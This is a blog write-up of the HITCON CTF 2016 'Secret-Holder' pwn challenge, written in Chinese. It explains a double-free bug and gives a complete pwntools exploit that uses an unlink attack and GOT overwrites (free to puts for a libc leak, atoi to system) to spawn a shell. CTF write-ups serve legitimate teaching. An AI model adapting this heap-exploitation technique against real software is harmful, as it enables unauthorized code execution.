---
title: 2016 HITCON CTF Secret-Holder
date: 2016-10-30 06:15:01
tags:
- ctf
- double free
- unlink
categories:
- ctf_practice
---

## Challenge

[程序](https://github.com/ctfs/write-ups-2016/tree/master/hitcon-ctf-2016/pwn/secret-holder-100)的wipe功能有漏洞，可以造成double free。
<!-- more -->
```c
__int64 wipe()
{
  /*......*/
  v3 = *MK_FP(__FS__, 40LL);
  puts("Which Secret do you want to wipe?");
  puts("1. Small secret");
  puts("2. Big secret");
  puts("3. Huge secret");
  memset(&s, 0, 4uLL);
  read(0, &s, 4uLL);
  v0 = atoi(&s);
  switch ( v0 )
  {
    case 2:
      free(big_q);
      big_status = 0;
      break;
    case 3:
      free(huge_q);
      huge_status = 0;
      break;
    case 1:
      free(samll_q);
      small_status = 0;
      break;
  }
  return *MK_FP(__FS__, 40LL) ^ v3;
}
```

## Solution

按照下面步骤我们可以overlapping部分top chunk：
keep(small)-->wipe(small)-->keep(big)-->wipe(small)-->keep(small)。(because of malloc consolidates fastbins if there is a large request)
OK，现在samll chunk和部分top chunk已经被big chunk overlapping了。常规思路是往house of force()想，但是缺少条件，即malloc(size)的size不能指定任意大小。所以不行，只好放弃。当时我做这题只意识到这是一个double free，但是怎么利用就不知道了。那时堆的题做的不多，经验尚缺。
最后看wp时才知道关键在huge chunk上。第一次malloc huge chunk时是在mapping区域分配相应内存，但是free后再次malloc就会在main arean中了。真的很神奇~~~~~~最后我还是去看了下[__libc_free](https://github.com/bminor/glibc/blob/master/malloc/malloc.c#L2909)&[sysmalloc](https://github.com/bminor/glibc/blob/master/malloc/malloc.c#L2246)。
所以最后我们只需要malloc一次huge chunk，然后free，最后再malloc就可以覆盖huge chunk的头部来unlink了。但是这题没给libc，这是另一个比较麻烦的地方，我还是用本机上的libc搞一下吧。

## Exp

```python
from pwn import *

debug = 1

if debug:
    p = process('./secret-holder')
else:
    pass

size_class = {'small': '1', 'big': '2', 'huge': '3'}

libc = ELF('./libc.so')

small_secret = 0x6020B0
big_secret = 0x6020A0
free_got = 0x602018
puts_plt = 0x4006C0
read_got = 0x602040
atoi_got = 0x602070

system_off = libc.symbols['read'] - libc.symbols['system']

def keep(size):
    p.recvuntil("3. Renew secret\n")
    p.sendline("1")
    p.recvuntil("3. Huge secret\n")
    p.sendline(size_class[size])
    p.recvuntil("Tell me your secret: \n")
    p.send(size)

def wipe(size):
    p.recvuntil("3. Renew secret\n")
    p.sendline("2")
    p.recvuntil("3. Huge secret\n")
    p.sendline(size_class[size])

def renew(size, content):
    p.recvuntil("3. Renew secret\n")
    p.sendline("3")
    p.recvuntil("3. Huge secret\n")
    p.sendline(size_class[size])
    p.recvuntil("Tell me your secret: \n")
    p.send(content)

keep('small')
wipe('small')
keep('big')
wipe('small')
keep('small')
keep('huge')
wipe('huge')
keep('huge')

payload1  = p64(0) + p64(0x21) + p64(small_secret - 0x18) + p64(small_secret - 0x10)   #although it's fastbin, it's in the range of samllbin
payload1 += p64(0x20) + p64(0x61A90) 
renew('big', payload1)
wipe('huge') 
payload2 = 'a' * 8 + p64(free_got) + 'b' * 8 + p64(big_secret) # padding + big_secret + huge_secret + small_secret

renew('small', payload2)
renew('big', p64(puts_plt))
renew('small', p64(read_got)) # *free_got = puts_plt, *big_secret = read_got

wipe('big')  # puts(read_got)
data = p.recvline()
read_addr = u64(data[:6] + '\x00\x00')
print "read_addr: " + hex(read_addr)
system_addr = read_addr - system_off
print "system_addr: " + hex(system_addr)

payload3 = p64(atoi_got) + 'a'*8 + p64(big_secret) + p64(1) # big_secret + huge_secret + small_secret + big_in_use_flag
renew('small', payload3)
renew('big', p64(system_addr)) #*atoi_got = system_addr

p.recvuntil('3. Renew secret\n')
p.send('sh')

p.interactive()
```

```shell
root@kali:~/Desktop# python secret-holder.py 
[+] Starting local process './secret-holder': Done
[*] '/root/Desktop/libc.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
read_addr: 0x7fac66987a80
system_addr: 0x7fac668eb870
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
```

